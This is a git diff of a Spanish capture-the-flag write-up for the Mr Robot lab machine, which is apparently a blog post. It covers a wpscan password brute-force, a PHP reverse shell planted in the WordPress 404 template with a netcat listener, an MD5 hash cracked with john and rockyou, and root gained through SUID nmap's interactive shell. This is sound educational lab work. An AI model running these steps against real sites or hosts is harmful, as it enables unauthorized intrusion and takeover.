@@ -191,7 +191,7 @@ $ sort fsocity.dic | uniq > fsocity-sorted.dic
 
 Este comando ordenará el diccionario y guardará la versión ordenada sin líneas duplicadas en un archivo llamado "fsocity-sorted.dic".
 
-Tenemos entonces un diccionario especial, un usuario enumerado (eliot), podemos atacar el sitio mientras exploramos con nuestro user elliot:
+Tenemos entonces un diccionario especial, un usuario enumerado (elliot), podemos atacar el sitio mientras exploramos con nuestro user elliot:
 
 ```bash
 wpscan --url 10.10.6.71 --wp-content-dir wp-admin --usernames fsocity-sorted.dic --passwords fsocity-sorted.dic
@@ -262,19 +262,11 @@ $
 ```
 
 ### Pagina 404 
+La alternativa es generar una pagina de 404 not found maliciosa que al cargar ejecute una **reverse shell**. Vamos a Apperance -> Editor -> 404 Template.
+Luego con esto seguimos la idea anterior de ir a: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php y obtener njuestra reverse shell con ```$ nc -lvp 1234```.
 
-TO DO
-TO DO
-TO DO
-TO DO
-TO DO
-TO DO
-TO DO
-TO DO
-TO DO
-TO DO
-TO DO
-TO DO
+![Alt text](/assets/Posts/MrRobot/plugins.png){: width="972" height="589" }
+_Post 404_
 
 
 ##  Dentro de la maquina
@@ -288,5 +280,87 @@ Busquemos que usuarios existen:
 ![Desktop View](/assets/Posts/MrRobot/robot.png){: width="972" height="589" }
 _Entrada exitosa_
 
-Ahi encontraremos la **segunda llave**... pero esta restringida para usuarios con privilegios 🤯
+Ahi encontraremos la **segunda llave**... pero esta restringida para un usuario llamado robot con privilegios 🤯
 
+Copiemos entonces el archivo de contraseña en md5 a nuestra PC y busquemos romper los privilegios utilizando el rockyou.txt y jhon the ripper.
+
+```bash
+$ john --format=raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hashrobado
+Using default input encoding: UTF-8
+Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
+Warning: no OpenMP support for this hash type, consider --fork=8
+Press 'q' or Ctrl-C to abort, almost any other key for status
+abcdefghijklmnopqrstuvwxyz (?)
+1g 0:00:00:00 DONE (2023-10-05 16:17) 11.11g/s 452266p/s 452266c/s 452266C/s bonjour1..teletubbies
+Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+```
+
+Con eso obtuvimos la password de **robot** y podremos hacer ```su robot```...y robar su flag!
+
+
+# Escalando privilegios
+
+Logramos escalar desde daemon (que corre wordpress) a robot, pero nuestro objetivo final es llegar a root. Para eso ejecutaremos lo siguiente:
+
+```shell
+robot@linux:~$ sudo -l
+[sudo] password for robot: 
+Sorry, user robot may not run sudo on linux.
+```
+
+Como no pudimos escalar con sudo veremos que programas compartimos con root
+
+```shell
+$ find / -user root -perm -4000 -exec ls -ldb {} \; 2> /dev/null
+
+-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
+-rwsr-xr-x 1 root root 69120 Feb 12  2015 /bin/umount
+-rwsr-xr-x 1 root root 94792 Feb 12  2015 /bin/mount
+-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
+-rwsr-xr-x 1 root root 36936 Feb 17  2014 /bin/su
+-rwsr-xr-x 1 root root 47032 Feb 17  2014 /usr/bin/passwd
+-rwsr-xr-x 1 root root 32464 Feb 17  2014 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 41336 Feb 17  2014 /usr/bin/chsh
+-rwsr-xr-x 1 root root 46424 Feb 17  2014 /usr/bin/chfn
+-rwsr-xr-x 1 root root 68152 Feb 17  2014 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 155008 Mar 12  2015 /usr/bin/sudo
+-rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap
+-rwsr-xr-x 1 root root 440416 May 12  2014 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 10240 Feb 25  2014 /usr/lib/eject/dmcrypt-get-device
+-r-sr-xr-x 1 root root 9532 Nov 13  2015 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+-r-sr-xr-x 1 root root 14320 Nov 13  2015 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+-rwsr-xr-x 1 root root 10344 Feb 25  2015 /usr/lib/pt_chown
+```
+
+El comando busca archivos propiedad del usuario "root" con el bit SUID activado en todo el sistema, mostrando información detallada y descartando errores.El mas llamativo es nmap.
+
+Vamos al viejo y confiable https://gtfobins.github.io/ en busca de exploits para el contenido de nmap.
+
+![Desktop View](/assets/Posts/MrRobot/nmap.png){: width="972" height="589" }
+_Escaladas posibles de nmap_
+
+```vim
+robot@linux:~$ nmap --interactive
+Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
+Welcome to Interactive Mode -- press h <enter> for help
+nmap> whoami
+Unknown command (nmap>) -- press h <enter> for help
+nmap> !sh
+# whoami
+root
+# ls
+key-2-of-3.txt	password.raw-md5
+# cd /root
+# ls
+firstboot_done	key-3-of-3.txt
+# cat key-3-of-3.txt
+```
+
+# Conclusiones 
+
+Luego de una maquina larga siempre es dificil recordar los puntos clave de aprendizaje. En esta maquina exisitieron los siguientes puntos clave:
+1. Fuzzing a todo, encontrar el robots.txt es sencillo y estandar pero siempre puede haber algo escondido en otro lado.
+2. De estar perdidos revisar el codigo fuente en busca de oro.
+3. GTFOBINS es increible.
+
+_Keep hacking_ 
